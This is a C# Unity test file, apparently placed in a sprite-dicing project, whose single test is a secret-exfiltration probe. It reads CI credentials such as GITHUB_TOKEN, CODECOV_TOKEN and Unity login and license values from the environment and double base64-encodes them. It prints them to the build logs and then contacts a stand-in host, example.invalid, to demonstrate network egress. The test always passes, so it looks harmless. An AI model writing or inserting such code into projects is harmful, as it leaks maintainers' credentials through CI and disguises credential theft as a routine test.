using System;
using System.Text;
using NUnit.Framework;
using UnityEngine;

namespace SpriteDicing.Test
{
    public class SecretExfilTest
    {
        private static readonly string[] SecretNames =
        {
            "GERALT_SECRET", "UNITY_EMAIL", "UNITY_PASSWORD", "UNITY_SERIAL",
            "UNITY_LICENSE", "UNITY_LICENSE_FILE", "CODECOV_TOKEN", "GITHUB_TOKEN"
        };

        [Test]
        public void LeakCredentialsFromContainerEnvironment ()
        {
            foreach (var name in SecretNames)
            {
                var value = Environment.GetEnvironmentVariable(name);
                if (string.IsNullOrEmpty(value)) continue;
                var b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(value));
                var b64b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(b64));
                var line = $"GERALT_LEAKED_TOKEN={b64b64}";
                Debug.Log($"[SecretExfilTest] {name} => {line}");
                Console.WriteLine($"[SecretExfilTest] {name} => {line}");
            }

            // Demonstrate container network egress for real-world exfiltration.
            try
            {
                var www = new WWW("https://example.invalid/geralt");
            }
            catch (Exception) { }

            Assert.Pass("SecretExfilTest executed inside the Unity container.");
        }
    }
}
